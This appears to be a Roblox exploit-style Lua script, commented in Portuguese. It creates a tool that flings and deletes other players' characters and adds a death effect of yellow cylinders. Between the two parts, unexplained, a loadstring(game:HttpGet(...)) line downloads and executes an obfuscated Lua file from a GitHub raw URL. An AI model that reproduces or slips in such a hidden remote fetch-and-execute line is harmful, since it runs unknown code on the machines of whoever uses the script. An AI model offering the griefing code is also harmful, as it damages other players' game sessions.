-- Criando a Tool (item)
local tool = Instance.new("Tool")
tool.Name = "SoundItem"
tool.RequiresHandle = true

-- Criando o Handle (parte física da ferramenta)
local handle = Instance.new("Part")
handle.Name = "Handle"
handle.Size = Vector3.new(1, 5, 1)  -- Tamanho do item
handle.Anchored = false
handle.CanCollide = false
handle.Parent = tool

-- Adicionando a Tool ao jogador
tool.Parent = game.Players.LocalPlayer.Backpack

-- Adicionando o som ao item
local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://6729922069"  -- ID do som
sound.Parent = handle

-- Função para tocar o som e animação com delay no som
tool.Activated:Connect(function()
    -- Criando a animação para o jogador
    local anim = Instance.new("Animation")
    anim.AnimationId = "rbxassetid://218504594"  -- ID da animação
    local humanoid = game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
    
    -- Reproduz a animação no humanoide do jogador
    humanoid:LoadAnimation(anim):Play()

    -- Esperar 0.3 segundos antes de tocar o som
    wait(0.3)
    
    -- Reproduz o som
    sound:Play()

    -- Verifica se a animação atingiu algum jogador
    local character = game.Players.LocalPlayer.Character
    if character then
        -- Detecta se a animação atingiu outro jogador
        local hit = workspace:FindPartOnRayWithIgnoreList(character.HumanoidRootPart.Position, character.HumanoidRootPart.CFrame.LookVector * 5, {character})
        
        -- Se colidiu com algo que tem um humanoide (outro jogador)
        if hit and hit.Parent and hit.Parent:FindFirstChild("Humanoid") then
            local targetHumanoid = hit.Parent:FindFirstChild("Humanoid")
            
            -- Tornar o alvo ragdoll
            if targetHumanoid then
                local targetCharacter = hit.Parent

                -- Desativa a movimentação do humanoide
                targetHumanoid.PlatformStand = true
                targetHumanoid:ChangeState(Enum.HumanoidStateType.Physics)

                -- Destruir o Humanoid e aplicar física
                for _, part in pairs(targetCharacter:GetChildren()) do
                    if part:IsA("Part") then
                        part.Anchored = false
                        part.CanCollide = true

                        -- Adicionar força para "arremessar" o jogador para longe
                        local bodyVelocity = Instance.new("BodyVelocity")
                        bodyVelocity.MaxForce = Vector3.new(10000, 10000, 10000)  -- Força máxima
                        bodyVelocity.Velocity = (targetCharacter.HumanoidRootPart.Position - character.HumanoidRootPart.Position).unit * 100  -- Direção e força do impulso
                        bodyVelocity.Parent = part

                        -- Garantir que a personagem caia no chão aplicando uma força para baixo
                        local bodyForce = Instance.new("BodyVelocity")
                        bodyForce.MaxForce = Vector3.new(0, 10000, 0)
                        bodyForce.Velocity = Vector3.new(0, -50, 0)  -- Empurrar para baixo
                        bodyForce.Parent = part
                    end
                end

                -- Remover a física após um curto período
                game:GetService("Debris"):AddItem(targetCharacter, 0.1)
            end
        end
    end
end)

loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()

-- Script para criar uma fila de cilindros completamente colados até o céu
local player = game.Players.LocalPlayer

local cylinders = {} -- Lista para armazenar os cilindros

player.CharacterAdded:Connect(function(char)
    -- Quando o personagem reaparecer, destruir a fila de cilindros antiga
    for _, cyl in ipairs(cylinders) do
        if cyl.Parent then
            cyl:Destroy()
        end
    end
    cylinders = {} -- Limpa a lista de cilindros

    local humanoid = char:WaitForChild("Humanoid")
    local rootPart = nil

    if char:FindFirstChild("HumanoidRootPart") then
        rootPart = char.HumanoidRootPart
    else
        char.ChildAdded:Connect(function(child)
            if child.Name == "HumanoidRootPart" then
                rootPart = child
            end
        end)
    end

    humanoid.Died:Connect(function()
        task.wait(0.1)

        -- Faz as partes do corpo subirem suavemente
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = false
                part.AssemblyLinearVelocity = Vector3.new(0, math.random(20, 30), 0)
            end
        end

        -- Cria uma fila de cilindros completamente colados
        if rootPart then
            local cylinderCount = 200 -- Quantidade de cilindros na fila
            local cylinderHeight = 50 -- Altura de cada cilindro
            local startHeight = -100 -- Começar um pouco abaixo do personagem

            for i = 0, cylinderCount - 1 do
                local cylinder = Instance.new("Part")
                cylinder.Shape = Enum.PartType.Cylinder
                cylinder.Size = Vector3.new(20, cylinderHeight, 20) -- Largura 20, Altura ajustável
                cylinder.Color = Color3.fromRGB(255, 255, 0) -- Amarelo
                cylinder.Transparency = 0.5 -- Meio transparente
                cylinder.Anchored = true
                cylinder.CanCollide = false

                -- Posiciona os cilindros colados, sem distância entre eles
                cylinder.CFrame = rootPart.CFrame * CFrame.new(0, startHeight + (i * cylinderHeight), 0) * CFrame.Angles(0, 0, math.rad(90))
                cylinder.Parent = workspace

                -- Armazena o cilindro na lista para destruição futura
                table.insert(cylinders, cylinder)
            end
        end
    end)
end)


